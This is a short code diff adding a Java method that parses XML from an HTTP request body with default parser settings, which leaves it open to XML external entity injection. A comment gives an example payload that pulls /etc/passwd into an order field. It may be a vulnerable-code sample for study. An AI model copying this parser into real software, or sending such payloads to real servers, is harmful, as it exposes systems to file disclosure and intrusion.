@@ -1,0 +1,13 @@
+public Document parseOrderXml(String xmlPayload) throws Exception {
+    // xmlPayload comes directly from the incoming HTTP request body
+    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+    DocumentBuilder builder = factory.newDocumentBuilder();
+    return builder.parse(new InputSource(new StringReader(xmlPayload)));
+}
+
+// Example payload submitted to POST /api/orders/import:
+// <?xml version="1.0"?>
+// <!DOCTYPE order [
+//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
+// ]>
+// <order><customerId>&xxe;</customerId></order>
